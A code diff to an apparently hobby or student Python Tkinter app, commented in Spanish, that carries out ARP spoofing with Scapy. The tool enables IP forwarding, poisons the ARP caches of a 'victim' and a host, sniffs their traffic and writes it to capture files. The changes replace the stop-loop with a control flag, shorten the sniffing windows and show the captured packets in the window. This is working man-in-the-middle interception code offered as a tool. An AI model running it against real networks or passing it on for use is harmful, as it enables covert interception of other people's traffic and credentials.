@@ -111,6 +111,7 @@ class App:
         GButton_798.place(x=250,y=240,width=122,height=30)
         GButton_798["command"] = self.GButton_798_command
         self.cont=280
+        self.control = True
 
     def GButton_797_command(self):
         # Aqui declaramos las variables que recibiran los valores que se introduciran en los inputs de la ventana
@@ -120,28 +121,35 @@ class App:
         #Se llama a la funcion habilitar_ruta()
         self.habilitar_ruta(verbose)
         #Hatsa que no se pulse el boton de parar no cesara el ataque
-        while not self.GButton_798_command:
+        if self.control:
             self.ataque(target,self.ip_host,verbose)
             #Hacemos sniff de los paquetes que esta enviando la victima durante 30 segundos
-            self.capture = sniff(filter=f"ip src host {target} or ip src host {self.ip_host}",timeout=int(30))
+            self.capture = sniff(filter=f"ip src host {target} or ip src host {self.ip_host}",timeout=int(10))
             #Printeamos el resumen de la captura por terminal
             print(self.capture.summary())
+            #Se despliega en la ventana el resumen de la captura de los paquetes
+        
+            label = tk.Label(root,text=str(self.capture),fg="green",bg="black",justify="center")
+            label.place(x=30,y=self.cont,width=530,height=20)
+            self.cont=self.cont+20
             #Se crea el archivo del output si se especifica y se escribe en el la informacion de los paquetes
             if output is not None:
                 wrpcap("App/rastreo_output/{}.cap".format(output),self.capture)
             self.ataque(self.ip_host,target,verbose)
             #Hacemos sniff de los paquetes que esta enviando la victima durante 30 segundos
-            self.capture = sniff(filter=f"ip src host {target} or ip src host {self.ip_host}",timeout=int(30))
+            self.capture = sniff(filter=f"ip src host {target} or ip src host {self.ip_host}",timeout=int(10))
             #Printeamos el resumen de la captura por terminal
             print(self.capture.summary())
+            #Se despliega en la ventana el resumen de la captura de los paquetes
+        
+            label = tk.Label(root,text=str(self.capture),fg="green",bg="black",justify="center")
+            label.place(x=30,y=self.cont,width=530,height=20)
+            self.cont=self.cont+20
             #Se crea el archivo del output si se especifica y se escribe en el la informacion de los paquetes
             if output is not None:
                 wrpcap("App/rastreo_output/{}.cap".format(output),self.capture)
             time.sleep(1)
-        #Se despliega en la ventana el resumen de la captura de los paquetes
-        label = tk.Label(root,text=str(self.capture),fg="green",bg="black",justify="center")
-        label.place(x=30,y=self.cont,width=530,height=20)
-        self.cont=self.cont+20
+        
     def ataque(self,target,ip_host,verbose):
         # Aqui llamamos a la funcion get_mac()
         mac_victima=self.get_mac(target)
@@ -167,6 +175,7 @@ class App:
         verbose = self.verbose
         mac_victima=self.get_mac(target)
         mac_host=self.get_mac(self.ip_host)
+        self.control= False
         #Aqui se especifica mediante el protocolo ARP las direccions MAC e IP normales y donde les corresponden
         respuesta_arp=ARP(pdst=target,hwdst=mac_victima,psrc=self.ip_host,hwsrc=mac_host,op='is-at')
         send(respuesta_arp,verbose=0,count=7)
@@ -207,7 +216,7 @@ class App:
         #Una vez habilitamos la ruta IP se printea por terminal y ventana
         if verbose:
             print("La ruta ip se ha habilitado")
-            label = tk.Label(root,text="La ruta IP se ha habilitado",fg="gren",bg="black",justify="center")
+            label = tk.Label(root,text="La ruta IP se ha habilitado",fg="green",bg="black",justify="center")
             label.place(x=30,y=self.cont,width=530,height=20)
             self.cont=self.cont+20
         
